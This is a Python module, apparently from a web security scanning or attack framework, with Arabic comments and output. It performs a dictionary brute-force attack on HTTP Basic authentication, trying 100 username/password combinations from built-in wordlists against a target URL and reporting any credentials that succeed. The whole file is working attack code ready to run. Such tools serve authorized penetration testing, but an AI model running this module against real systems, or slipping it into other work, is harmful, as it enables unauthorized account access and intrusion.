# basic-auth.py — هجوم Basic Auth بقائمة مدمجة
import base64
from core.registry import module
from core.http import req
from core.wordlists import USERS, PASSES

@module("basic-auth", "auth", "هجوم Basic Auth")
def run(base, a, R):
    for u in USERS[:10]:
        for pw in PASSES[:10]:
            tok = base64.b64encode(f"{u}:{pw}".encode()).decode()
            st, h, _ = req(base, headers={"Authorization": f"Basic {tok}"})
            if st not in (401, 403, 0):
                R.vuln(f"Basic auth ناجح: {u}:{pw} (HTTP {st})")
                R.info("WWW-Authenticate: " + h.get("www-authenticate", "؟"))
                return
    R.info("لا اعتمادات صالحة في القائمة المدمجة (100 تركيبة)")
